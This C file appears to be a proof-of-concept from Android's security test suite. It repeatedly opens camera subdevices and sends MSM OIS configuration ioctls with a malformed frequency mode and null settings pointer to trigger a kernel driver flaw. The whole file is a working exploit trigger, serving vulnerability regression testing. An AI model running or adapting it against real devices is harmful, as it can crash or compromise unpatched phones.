/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include "local_poc.h"

int main(int argc, char **argv) {
  int fd, ret, i, count;
  pthread_t tid[2];
  char buf[256];
  char subdev[32] = {0};

  struct msm_ois_cfg_data data;
  struct msm_ois_set_info_t *info;
  struct msm_ois_params_t *param;

  count = 0;
retry:
  for (i = 0; i < 32; i++) {
    if (snprintf(subdev, sizeof(subdev), "/dev/v4l-subdev%d", i) < 0) {
      exit(EXIT_FAILURE);
    }
    fd = open(subdev, O_RDWR, 0);
    if (fd < 0) {
      return -1;
    }

    data.cfgtype = CFG_OIS_INIT;
    ret = ioctl(fd, VIDIOC_MSM_OIS_CFG, &data);

    data.cfgtype = CFG_OIS_CONTROL;
    info = &data.cfg.set_info;
    param = &info->ois_params;
    param->i2c_freq_mode = 639630796;
    param->setting_size = 5;
    param->settings = 0;

    ret = ioctl(fd, VIDIOC_MSM_OIS_CFG, &data);

    close(fd);

    fd = open(subdev, O_RDWR, 0);
    if (fd < 0) {
      return -1;
    }

    data.cfgtype = CFG_OIS_INIT;
    ret = ioctl(fd, VIDIOC_MSM_OIS_CFG, &data);

    data.cfgtype = CFG_OIS_CONTROL;
    info = &data.cfg.set_info;
    param = &info->ois_params;
    param->i2c_freq_mode = 639630796;
    param->setting_size = 5;
    param->settings = 0;

    ret = ioctl(fd, VIDIOC_MSM_OIS_CFG, &data);

    close(fd);
  }
  sleep(0.5);
  printf("[pid:%d] try %d again!\n", getpid(), ++count);
  goto retry;
  return 0;
}
